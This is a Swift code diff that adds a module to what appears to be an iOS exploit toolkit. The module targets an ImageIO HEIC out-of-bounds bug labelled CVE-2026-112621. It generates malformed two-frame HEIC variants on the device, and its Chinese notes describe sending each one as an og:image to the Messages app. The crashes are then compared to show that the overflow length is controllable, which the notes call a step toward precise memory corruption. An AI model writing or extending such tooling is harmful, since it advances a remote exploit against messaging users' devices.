@@ -138,5 +138,46 @@ extension Catalog {
                 return ModuleOutcome(headline: headline, detail: detail,
                                      evidence: evidence, artifacts: artifacts)
             }),
+
+        ExploitModule(
+            id: "iio.heic.sweep",
+            titleZh: "HEIC 帧高扫描（为投递侧准备变体）",
+            cve: "CVE-2026-112621",
+            component: "ImageIO → LinkPresentation（投递侧）",
+            primitive: .probe,
+            reach: .systemProcess,
+            tier: 3,
+            summaryZh: "本模块刻意不触发崩溃。它在设备上生成帧高不同的两帧 HEIC：帧 0 固定 256×16，帧 1 分别为 48/64/96/128，用于投递侧的越界长度扫描 —— 每个变体作为 og:image 发给信息 App，比较崩溃地址是否随帧高可预测地移动。可预测即为「越界长度可控」，那是从「撞墙」走向「精确踩中对象」的第一步。",
+            notesZh: "为什么必须在设备上生成：越界长度由帧 1 的实际解码尺寸决定，不是容器里声明的 ispe。只改声明不改码流，解码尺寸不变，不会复现。设备编码器无法在离线环境替代，所以变体只能由 App 生成、经备份取出。产物写在 work/ 下，文件名 heic_h<高度>.heic。",
+            run: { ctx in
+                ctx.arm("iio.heic.sweep", "generate variants")
+                var lines: [String] = []
+                var artifacts: [URL] = []
+                let heights = [48, 64, 96, 128]
+                for height in heights {
+                    let name = "heic_h" + "\(height)" + ".heic"
+                    let target = ctx.workdir.appendingPathComponent(name)
+                    guard let data = HEICPayload.writeTwoFrames(to: target, width: 256,
+                                                               firstHeight: 16,
+                                                               secondHeight: height),
+                          data.count > 0 else {
+                        lines.append(name + tl("：生成失败"))
+                        continue
+                    }
+                    artifacts.append(ctx.write(name, data))
+                    lines.append(name + "  \(data.count) B" + tl(" · 帧1 高 ") + "\(height)")
+                }
+                ctx.disarm("iio.heic.sweep", "variants=\(artifacts.count)")
+
+                let headline = tl("已生成 ") + "\(artifacts.count)" + tl(" 个变体")
+                let detail = lines.joined(separator: "\n")
+                let evidence = [
+                    tl("帧0 固定 256×16，帧1 分别 48/64/96/128"),
+                    tl("必须在设备上生成：越界长度取决于实际解码尺寸"),
+                    tl("产物随备份取出，再挂到 og:image 做投递扫描"),
+                ]
+                return ModuleOutcome(headline: headline, detail: detail,
+                                     evidence: evidence, artifacts: artifacts)
+            }),
     ]
 }
